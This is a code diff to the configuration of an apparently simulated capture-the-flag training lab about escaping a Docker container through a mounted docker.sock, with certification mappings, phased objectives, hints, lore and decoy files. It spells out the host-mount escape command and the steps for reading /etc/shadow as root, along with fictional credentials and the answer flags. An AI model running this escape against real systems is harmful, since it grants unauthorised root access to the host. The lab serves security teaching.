@@ -27,8 +27,146 @@ const A11Config = {
         mappings: [
             { flagId: 'user', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources', skill: 'Docker Socket Exploitation' },
             { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources', skill: 'Container Escape to Host' }
+        ],
+        // SY0-701 (Security+) supplemental mappings — virtualization & container security
+        supplemental: [
+            {
+                cert: 'SY0-701',
+                domain: '2.0 — Threats, Vulnerabilities, and Mitigations',
+                objective: '2.3',
+                description: 'Explain various types of vulnerabilities: container/virtualization misconfigurations (privileged containers, mounted Docker sockets)',
+                skill: 'Container Misconfiguration Identification',
+                mitre: 'T1611'
+            },
+            {
+                cert: 'SY0-701',
+                domain: '4.0 — Security Operations',
+                objective: '4.1',
+                description: 'Given a scenario, apply common security techniques to computing resources: container security controls and isolation boundaries',
+                skill: 'Container Security Hardening',
+                mitre: 'T1610'
+            },
+            {
+                cert: 'SY0-701',
+                domain: '2.0 — Threats, Vulnerabilities, and Mitigations',
+                objective: '2.2',
+                description: 'Explain common threat vectors and attack surfaces: exposed management interfaces (Docker socket as root-equivalent access)',
+                skill: 'Attack Surface Enumeration',
+                mitre: 'T1046'
+            },
+            {
+                cert: 'SY0-701',
+                domain: '4.0 — Security Operations',
+                objective: '4.2',
+                description: 'Given a scenario, apply the appropriate vulnerability scanning methods: identify container escape paths via capability abuse and bind mounts',
+                skill: 'Container Vulnerability Assessment',
+                mitre: 'T1082'
+            },
+            {
+                cert: 'SY0-701',
+                domain: '3.0 — Security Architecture',
+                objective: '3.1',
+                description: 'Compare and contrast security implications of different architecture models: microservices / containerized architecture trust boundaries',
+                skill: 'Container Architecture Analysis',
+                mitre: 'T1068'
+            }
         ]
     },
+
+    // ===============================================================
+    // PHASES — Docker Container Escape kill chain
+    // ===============================================================
+
+    phases: [
+        {
+            id: 'phase1',
+            name: 'Recon',
+            description: 'Identify the target and enumerate exposed services.',
+            objectives: [
+                'Run nmap against 10.10.14.40 — identify open ports (80, 2222)',
+                'Browse the Archivist Guild web portal at http://10.10.14.40/vault/',
+                'Review /vault/status/ for container infrastructure details',
+                'Review /vault/api/ for Docker socket exposure and SSH credentials'
+            ],
+            mitre: [
+                { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
+                { id: 'T1595', name: 'Active Scanning', tactic: 'Reconnaissance' }
+            ],
+            hint: 'Start with a full nmap scan, then explore the web portal — the status and API pages are openly accessible and deliberately leak operational details.',
+            completeWhen: 'Player reads /vault/api/ or /vault/status/ in browser'
+        },
+        {
+            id: 'phase2',
+            name: 'Container Enumeration',
+            description: 'Gain initial access to the container and identify the Docker misconfiguration.',
+            objectives: [
+                'SSH into vault-indexer-01 via port 2222 (credentials: archivist / see API docs)',
+                'Run id — confirm membership in the docker group',
+                'Run ls -la /var/run/ — discover the exposed docker.sock',
+                'Run cat /proc/1/cgroup — confirm you are inside a Docker container',
+                'Run capsh --print — enumerate elevated container capabilities',
+                'Read the user flag at /var/log/vault/user.txt'
+            ],
+            mitre: [
+                { id: 'T1082', name: 'System Information Discovery', tactic: 'Discovery' },
+                { id: 'T1087', name: 'Account Discovery', tactic: 'Discovery' },
+                { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
+                { id: 'T1610', name: 'Deploy Container', tactic: 'Defense Evasion' }
+            ],
+            hint: 'Once inside the container, check group membership (id) and look at /var/run/ — the docker.sock file is your primary vector.',
+            completeWhen: 'Player submits user flag (flag{d0ck3r_s0ck3t_3xp0s3d_v4ult})'
+        },
+        {
+            id: 'phase3',
+            name: 'Container Exploitation',
+            description: 'Abuse the exposed Docker socket to prepare for escape.',
+            objectives: [
+                'Run docker ps — enumerate all running containers via the daemon socket',
+                'Run docker inspect vault-indexer-01 — confirm /var/run/docker.sock bind mount',
+                'Run docker info — retrieve host OS details (vault-host, Ubuntu 22.04)',
+                'Identify alpine image available locally for the escape container'
+            ],
+            mitre: [
+                { id: 'T1613', name: 'Container and Resource Discovery', tactic: 'Discovery' },
+                { id: 'T1552', name: 'Unsecured Credentials', tactic: 'Credential Access' }
+            ],
+            hint: 'docker inspect vault-indexer-01 shows the Mounts array — this is the blueprint for your escape. Look for which images are already pulled to avoid network noise.',
+            completeWhen: 'Player runs docker ps or docker inspect successfully'
+        },
+        {
+            id: 'phase4',
+            name: 'Container Escape',
+            description: 'Spawn a privileged container with the host filesystem mounted to break out of container isolation.',
+            objectives: [
+                'Run: docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash',
+                'Confirm host shell: hostname returns vault-host, id returns uid=0(root)',
+                'Enumerate host filesystem: ls /opt/ reveals master_manifest.txt'
+            ],
+            mitre: [
+                { id: 'T1611', name: 'Escape to Host', tactic: 'Privilege Escalation' },
+                { id: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation' }
+            ],
+            hint: 'The docker run command mounts / (host root) into the new container at /mnt/host, then chroot makes that your working root — instantly giving you a root shell on the physical host.',
+            completeWhen: 'Player activates _hostShellActive state via docker run escape command'
+        },
+        {
+            id: 'phase5',
+            name: 'Host Compromise',
+            description: 'Operate as root on the Docker host and retrieve the Master Manifest.',
+            objectives: [
+                'Confirm root on host: cat /etc/hostname (vault-host), cat /etc/passwd',
+                'Retrieve the root flag: cat /opt/master_manifest.txt',
+                'Optional deep dive: cat /etc/shadow, review /etc/docker/daemon.json',
+                'Submit the root flag to complete the box'
+            ],
+            mitre: [
+                { id: 'T1005', name: 'Data from Local System', tactic: 'Collection' },
+                { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' }
+            ],
+            hint: 'You are root on the host. The Master Manifest is in /opt/. The shadow file is a bonus. Document your escape path for the debrief.',
+            completeWhen: 'Player submits root flag (flag{c0nt41n3r_3sc4p3_m4st3r_m4n1f3st})'
+        }
+    ],
 
     // ===============================================================
     // BOOT SEQUENCE
@@ -105,23 +243,27 @@ const A11Config = {
     hints: [
         {
             id: 'hint1',
+            cost: 10,
             text: "Check if the Docker socket is mounted inside the container. SSH into the target and run: ls -la /var/run/docker.sock",
-            penalty: -50
+            penalty: -10
         },
         {
             id: 'hint2',
+            cost: 25,
             text: "The Docker socket gives you full control of the Docker daemon. Try: docker ps",
-            penalty: -50
+            penalty: -25
         },
         {
             id: 'hint3',
+            cost: 50,
             text: "Mount the host filesystem into a new container: docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash",
             penalty: -50
         },
         {
             id: 'hint4',
+            cost: 75,
             text: "The Master Manifest is at /opt/master_manifest.txt on the host filesystem",
-            penalty: -50
+            penalty: -75
         }
     ],
 
@@ -130,6 +272,58 @@ const A11Config = {
     // ===============================================================
 
     lore: {
+        intro: 'The Archivist Guild has protected the knowledge of nations for three centuries — cataloguing secrets so sensitive that even their owners forgot they existed. Their vault system was the last word in archival security: containerized, isolated, air-gapped from the outside world. Or so they believed.',
+
+        scenario: 'Intel suggests the Guild\'s archive network was compromised in a supply chain attack six months ago. An unknown actor inserted a backdoor at the infrastructure level — not in the application code, but in the container orchestration layer itself. The Guild\'s self-healing indexer service quietly received a configuration change: one additional line in the Compose file, mounting /var/run/docker.sock into the container for "automated management." The Guild\'s infrastructure team signed off on it without reading the security implications. Your mission is to trace that attack path, reproduce it, and exfiltrate the Master Manifest — the index to every archive the Guild has ever held. If it\'s out there, the Guild needs to know it\'s compromised.',
+
+        ecer: {
+            // ECER = Educational Cybersecurity Event Record — PhD research instrumentation
+            // Maps box completion to learning outcomes and research metrics
+            researchDomain: 'Container Security & Virtualization Exploitation',
+            bloomsLevel: 5,                   // Evaluate — student must reason about trust model, not just execute
+            bloomsVerb: 'Evaluate container trust boundaries and exploit misconfigurations to demonstrate privilege escalation',
+            conceptualFramework: 'Defense in Depth / Least Privilege / Attack Surface Reduction',
+            prereqConcepts: [
+                'Linux filesystem and process model',
+                'SSH protocol and key-based authentication',
+                'Docker basics: images, containers, volumes, networks',
+                'Unix socket communication',
+                'Linux capabilities model'
+            ],
+            targetCompetencies: [
+                'Identify container escape vectors from inside a running container',
+                'Explain why a mounted Docker socket is equivalent to host root access',
+                'Demonstrate the docker run -v / bind-mount escape technique',
+                'Articulate the principle of least privilege in a containerized microservices context',
+                'Propose mitigations: socket removal, rootless Docker, seccomp/AppArmor profiles, read-only socket mounts'
+            ],
+            difficultyMetrics: {
+                cognitiveLoad: 'HIGH',            // Multi-layer environment (Kali → container → host)
+                toolFamiliarity: 'INTERMEDIATE',  // Docker CLI expected but socket concept is novel
+                prerequisiteDepth: 'MEDIUM',      // Needs Linux + Docker basics, not reversing/crypto
+                expectedTimeMinutes: { min: 20, max: 45 }
+            },
+            researchInstrumentation: {
+                preAssessmentPrompt: 'Before starting: What is /var/run/docker.sock? Who owns it? What happens if a process inside a container can write to it?',
+                postAssessmentPrompt: 'After completing: Describe three mitigations that would prevent this attack. Which would you deploy first in a production environment and why?',
+                observableIndicators: [
+                    'Student recognizes docker group membership in id output (container enumeration phase)',
+                    'Student navigates from /var/run/ discovery → docker ps → docker inspect without hints',
+                    'Student correctly constructs the docker run escape command without hint3',
+                    'Student articulates trust boundary violation in post-box debrief'
+                ]
+            },
+            certAlignment: {
+                primary: 'SY0-701',
+                secondary: ['CS0-003', 'CAS-004'],
+                examObjectives: [
+                    'SY0-701 2.3 — Container/virtualization vulnerabilities',
+                    'SY0-701 3.1 — Microservices/containerized architecture security',
+                    'CS0-003 4.1 — Security techniques for computing resources'
+                ]
+            }
+        },
+
         outro: 'The Archivist Guild\'s impenetrable vault was a lie. A single mounted socket — /var/run/docker.sock — gave you the keys to the kingdom. From inside a container meant to isolate, you reached out to the Docker daemon, spawned a privileged container with the host filesystem mounted at your feet, and extracted the Master Manifest. The lesson: container isolation is only as strong as its configuration. A mounted Docker socket is root access with extra steps.'
     },
 
@@ -827,14 +1021,27 @@ drwxr-xr-x 3 root      root      4096 Dec  2 14:22 ..
                 }
                 if (target === '/app' || target === '/app/') {
                     if (longFormat) {
-                        return `total 16
+                        return `total 28
 drwxr-xr-x 2 archivist archivist 4096 Dec  1 08:14 .
 drwxr-xr-x 1 root      root      4096 Dec  2 14:22 ..
 -rwxr-xr-x 1 archivist archivist 2841 Dec  1 08:14 indexer.py
 -rw-r--r-- 1 archivist archivist  412 Dec  1 08:14 config.yaml
--rw-r--r-- 1 archivist archivist   89 Dec  1 08:14 requirements.txt`;
+-rw-r--r-- 1 archivist archivist   89 Dec  1 08:14 requirements.txt
+-rw-r--r-- 1 root      root       631 Nov 30 09:44 Dockerfile
+-rw-r--r-- 1 archivist archivist  188 Dec  1 08:14 .env.bak`;
                     }
-                    return 'config.yaml  indexer.py  requirements.txt';
+                    return 'Dockerfile  .env.bak  config.yaml  indexer.py  requirements.txt';
+                }
+                if (target === '/var/backups' || target === '/var/backups/') {
+                    if (longFormat) {
+                        return `total 20
+drwxr-xr-x 2 root      root      4096 Nov 28 15:30 .
+drwxr-xr-x 1 root      root      4096 Dec  2 14:22 ..
+-rw-r--r-- 1 root      root      1024 Nov 28 15:30 docker-compose.bak.yml
+-rw-r--r-- 1 root      root       256 Nov 28 15:30 vault_creds_old.txt
+-rw-r--r-- 1 root      root       512 Nov 29 11:10 mount_test_volume.log`;
+                    }
+                    return 'docker-compose.bak.yml  mount_test_volume.log  vault_creds_old.txt';
                 }
                 if (target === '' || target === '~' || target === '/home/archivist') {
                     if (longFormat) {
@@ -981,6 +1188,143 @@ if __name__ == '__main__':
                 }
                 if (target === '/app/requirements.txt') {
                     return 'docker==6.1.3\npsycopg2-binary==2.9.9\npyyaml==6.0.1';
+                }
+                // ── Decoy files — plausible but misleading ──────────
+                if (target === '/app/Dockerfile') {
+                    return `FROM python:3.11-slim-alpine
+
+LABEL maintainer="infra@archivist-guild.internal"
+LABEL version="2.4"
+LABEL description="Vault Indexer — Automated archive management service"
+
+# [DECOY] This Dockerfile does NOT show the socket mount —
+# that is configured at runtime in docker-compose.yml.
+# The Dockerfile itself looks completely benign.
+
+RUN apk add --no-cache openssh-server curl
+
+# Create service account
+RUN addgroup -S archivist && adduser -S -G archivist archivist
+RUN addgroup archivist docker
+
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY indexer.py config.yaml ./
+
+# SSH for "maintenance access" (port 2222 exposed in compose)
+COPY sshd_config /etc/ssh/
+RUN ssh-keygen -A
+
+EXPOSE 22
+
+CMD ["python3", "/app/indexer.py"]
+
+# Note: docker.sock mount is defined in docker-compose.yml:
+#   volumes:
+#     - /var/run/docker.sock:/var/run/docker.sock
+# This is intentional for self-healing orchestration. DO NOT REMOVE.
+# -- DevOps Team, 2024-11-28`;
+                }
+                if (target === '/app/.env.bak') {
+                    return `# Backup env file — OUTDATED, do not use
+# Rotate these credentials — they have been superseded
+
+VAULT_DB_HOST=vault-db-01
+VAULT_DB_PORT=5432
+VAULT_DB_USER=indexer_svc
+VAULT_DB_PASS=idx_OLD_p4ss_2023
+
+DOCKER_HOST=unix:///var/run/docker.sock
+VAULT_REGISTRY=registry.archivist-guild.internal:5000
+VAULT_REGISTRY_USER=push_bot
+VAULT_REGISTRY_PASS=r3g1stry_push_2023_ROTATED
+
+# [DECOY] These credentials are stale and will not work on current systems.
+# The active credentials are in config.yaml (idx_s3rv1c3_2024).
+# This file was left as a breadcrumb for compliance audit trails.`;
+                }
+                if (target === '/var/backups/docker-compose.bak.yml') {
+                    return `# docker-compose.yml — Archivist Guild Vault Stack
+# BACKUP COPY — do not deploy directly
+# Active file is on the Docker host at /opt/guild/docker-compose.yml
+
+version: '3.8'
+
+services:
+  vault-web-01:
+    image: nginx:1.24-alpine
+    ports:
+      - "80:80"
+    networks:
+      - vault_network
+
+  vault-indexer-01:
+    image: archivist/indexer:2.4
+    ports:
+      - "2222:22"
+    volumes:
+      # [!] CRITICAL MISCONFIGURATION — Docker socket bind-mount
+      # Originally added 2024-11-28 for "self-healing" feature.
+      # SECURITY REVIEW PENDING — this grants host root via docker group.
+      - /var/run/docker.sock:/var/run/docker.sock
+    networks:
+      - vault_network
+    environment:
+      - DOCKER_HOST=unix:///var/run/docker.sock
+
+  vault-db-01:
+    image: postgres:16-alpine
+    environment:
+      POSTGRES_DB: archival_records
+      POSTGRES_USER: indexer_svc
+      POSTGRES_PASSWORD: idx_s3rv1c3_2024
+    networks:
+      - vault_network
+
+  vault-logs-01:
+    image: fluentd:v1.16
+    networks:
+      - vault_network
+
+networks:
+  vault_network:
+    driver: bridge
+
+# [DECOY NOTE] You found the compose file — well done.
+# But the escape is through the live socket, not this backup.
+# docker run -v /:/mnt/host ...`;
+                }
+                if (target === '/var/backups/vault_creds_old.txt') {
+                    return `# Vault Credentials Archive — 2023 Rotation Log
+# [DECOY] All entries below are ROTATED and non-functional.
+
+vault-web-01  admin:vaultAdmin2023!
+vault-db-01   postgres:db_guild_2023
+vault-db-01   indexer_svc:idx_s3rv1c3_2023
+
+SSH (container):  archivist:arch1v1st_2023
+SSH (host):       guild-ops:g41ld0ps_2023
+
+Guild Master Key Backup: /data/keys/master-2023.key (DELETED after rotation)
+
+Note: Current credentials are in /app/config.yaml (vault-indexer-01).
+Docker socket access supersedes credential-based auth for container escape.`;
+                }
+                if (target === '/var/backups/mount_test_volume.log') {
+                    return `[2024-11-29 11:10:22] INFO  Volume mount test initiated
+[2024-11-29 11:10:22] INFO  Testing bind mount: /var/run/docker.sock → /var/run/docker.sock
+[2024-11-29 11:10:23] INFO  Socket accessible from container context: YES
+[2024-11-29 11:10:23] INFO  docker group membership verified: archivist
+[2024-11-29 11:10:24] WARN  Security note: socket mount grants daemon access from container
+[2024-11-29 11:10:24] INFO  Test command: docker ps → 4 containers listed (OK)
+[2024-11-29 11:10:25] INFO  Self-healing test: restart simulation → vault-logs-01 (OK)
+[2024-11-29 11:10:25] INFO  Volume mount test PASSED — proceeding to production deploy
+
+# [DECOY] This log file confirms the socket mount was a deliberate (if misguided)
+# infrastructure decision. The security review ticket was never actioned.
+# See JIRA INFRA-4421: "Docker socket security audit" — status: OPEN`;
                 }
                 if (target === '/proc/1/cgroup') {
                     return `12:devices:/docker/a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
